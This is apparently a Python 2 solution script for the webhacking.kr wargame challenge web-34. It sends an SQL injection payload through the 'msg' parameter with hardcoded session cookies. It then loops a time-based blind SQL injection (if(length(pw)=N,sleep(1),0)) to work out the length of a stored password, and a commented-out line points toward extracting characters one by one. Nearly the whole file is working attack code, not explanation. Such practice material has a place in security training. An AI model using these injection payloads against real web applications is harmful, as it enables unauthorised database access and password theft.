#-*- coding: utf-8 -*-
import sys
import time
import urllib
import urllib2

import CookieManager


challengeUrl = "http://webhacking.kr/challenge/web/web-34/index.php"

print "[*] SQL Injection"
CookieManager.addCookie("PHPSESSID", "e52509baa15ced3a5be56d2efc0239b6")

parameters  = "?msg=" + urllib.quote("bindon','bindon',1); -- ")
parameters += "&se=1"

httpRequest = urllib2.Request(challengeUrl+parameters)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

print "[+] Find password length"
passwordLength = 0
isFoundPassword = False

CookieManager.addCookie("PHPSESSID", "73ea5f35f558006f21f6185c171a2ed9")

for passwordLength in range(1, 30):
    parameters  = "?msg=1024"
    #parameters += "&se=if(substr(pw,%d,1)=%d,sleep(1),0)" % ()
    parameters += "&se=if(length(pw)=%d,sleep(1),0)" % passwordLength
    httpRequest = urllib2.Request(challengeUrl+parameters)
    print challengeUrl+parameters
    httpRequest.add_header("Cookie", CookieManager.getCookie())
    
    httpConnection = None
    try:
        elapsedTime = time.time()
        httpConnection = urllib2.urlopen(httpRequest)
        httpResponse = httpConnection.read()
        
        print "[*] Blind SQL Injection...", passwordLength
        print time.time() - elapsedTime
        """
        if httpResponse.find(trueCondition) > 0:
            print "[!] FIND IT! password length is [", passwordLength, "]"
            isFoundPassword = True
            break
        """
    except:
        raise
    finally:
        if httpConnection != None:
            httpConnection.close()

if not isFoundPassword:
    sys.exit(-1)
